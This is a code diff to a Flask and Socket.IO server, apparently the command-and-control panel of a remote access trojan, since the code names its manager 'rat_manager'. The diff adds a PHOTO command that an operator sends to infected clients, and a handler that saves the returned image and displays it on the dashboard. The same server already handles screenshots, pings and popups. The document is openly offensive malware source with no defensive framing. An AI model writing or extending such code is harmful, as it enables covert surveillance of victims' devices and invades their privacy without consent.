@@ -154,6 +154,25 @@ class ClientHandler(threading.Thread):
                 except Exception as e:
                     socketio.emit('error', {'message': f'Screenshot save error: {e}'})
                     
+        elif msg_type == ResponseTypes.PHOTO:
+            payload = parsed.get('payload')
+            if payload:
+                # Save photo
+                timestamp = int(time.time())
+                filename = f"photo_{self.client_id.replace(':', '_')}_{timestamp}.jpg"
+                filepath = os.path.join('static', 'photos', filename)
+                
+                try:
+                    Protocol.decode_image(payload, filepath)
+                    socketio.emit('photo_received', {
+                        'client_id': self.client_id,
+                        'filename': filename,
+                        'timestamp': timestamp,
+                        'url': f'/static/photos/{filename}'
+                    })
+                except Exception as e:
+                    socketio.emit('error', {'message': f'Photo save error: {e}'})
+                    
         elif msg_type == ResponseTypes.POPUP:
             payload = parsed.get('payload', {})
             socketio.emit('popup_response', {
@@ -256,6 +275,17 @@ def send_ping_command():
     
     if rat_manager.send_command_to_client(client_id, Commands.PING):
         return jsonify({'status': 'success', 'message': 'Ping command sent'})
+    else:
+        return jsonify({'status': 'error', 'message': 'Failed to send command'})
+
+@app.route('/api/command/photo', methods=['POST'])
+def send_photo_command():
+    """Send photo command to client"""
+    data = request.json
+    client_id = data.get('client_id')
+    
+    if rat_manager.send_command_to_client(client_id, Commands.PHOTO):
+        return jsonify({'status': 'success', 'message': 'Photo command sent'})
     else:
         return jsonify({'status': 'error', 'message': 'Failed to send command'})
 
